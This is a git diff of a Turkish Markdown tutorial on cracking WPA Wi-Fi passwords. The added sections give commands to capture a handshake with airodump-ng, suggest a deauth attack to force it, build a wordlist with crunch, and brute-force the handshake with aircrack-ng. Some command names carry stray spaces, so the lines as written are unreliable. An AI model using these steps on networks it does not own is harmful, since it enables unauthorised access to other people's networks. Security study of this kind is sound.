@@ -136,10 +136,27 @@ Eğer Ağda Yeteri Kadar Cihaz Yoksa
 
 ```aircrack -ng airodumptest.cap (Tarama Sırasında Yazdırdığımız Dosya)``` 
 
-```**192.168.1.1** modeminizin ara yüzüne giriş yaparsınız```
+```192.168.1.1 modeminizin ara yüzüne giriş yaparsınız```
 
 ### VPA ve VPA2 Parola Kırma
 
 > ### Handshake Yakalama
+
+``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```
+
+```
+channel: Ağın çalıştığı kanal
+bssid: Ağın MAC adresi
+write: Yakalanan handshake'in nereye kayıt edileceği
+```
+
+**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**
+
 > ### Wordlist Oluşturma
+
+``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` 
+içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur
+
 > ### Parola Kırma
+
+``` aircrack -ng handshake-file.cap -w passwrd.txt``` handshake dosyasını ve worlisti kullanarak brute froce saldırısı yapar
